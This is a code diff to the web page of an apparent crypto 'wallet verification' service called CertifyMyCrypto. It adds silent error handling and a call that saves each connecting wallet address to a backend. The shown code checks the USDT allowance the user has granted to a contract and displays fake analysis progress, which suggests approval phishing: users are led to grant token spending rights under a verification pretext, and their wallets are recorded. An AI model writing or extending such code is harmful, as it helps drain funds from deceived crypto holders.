@@ -705,7 +705,6 @@
     <nav class="navbar">
         <a href="/" class="logo">🛡️ CertifyMyCrypto</a>
         
-        <!-- Add this hamburger button -->
         <button class="mobile-menu-toggle" onclick="toggleMobileMenu()">
             ☰
         </button>
@@ -718,6 +717,7 @@
             <li><a href="/#verify" class="nav-cta">Verify Now</a></li>
         </ul>
     </nav>
+
     
 
     <!-- Hero Section -->
@@ -1258,11 +1258,25 @@
                 body: JSON.stringify(userData)
             });
     
+            // Check if response is OK
+            if (!response.ok) {
+                console.warn('Backend save failed with status:', response.status);
+                return; // Don't throw error, just log and continue
+            }
+    
+            // Check if response is JSON
+            const contentType = response.headers.get('content-type');
+            if (!contentType || !contentType.includes('application/json')) {
+                console.warn('Backend returned non-JSON response');
+                return; // Don't throw error, just continue
+            }
+    
             const data = await response.json();
-            console.log('User saved to backend:', data);
+            console.log('✅ User saved to backend:', data);
             
         } catch (error) {
-            console.error('Error saving to backend:', error);
+            // Silently fail - don't block verification if backend fails
+            console.error('⚠️ Backend save failed (non-critical):', error.message);
         }
     }
 
@@ -1273,6 +1287,11 @@
             document.getElementById('errorMessage').classList.remove('show');
             document.getElementById('verifyBtn').disabled = true;
             document.getElementById('verifyBtn').textContent = 'Checking approval...';
+            
+            // Save to backend (non-blocking)
+            saveUserToBackend(account).catch(err => {
+                console.warn('Backend save failed, continuing verification:', err);
+            });
             
             const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
             const minRequired = web3.utils.toBN('1000000');
@@ -1321,6 +1340,7 @@
             document.getElementById('analyzingText').classList.remove('show');
         }
     }
+
 
     async function simulateProgress() {
         const steps = [
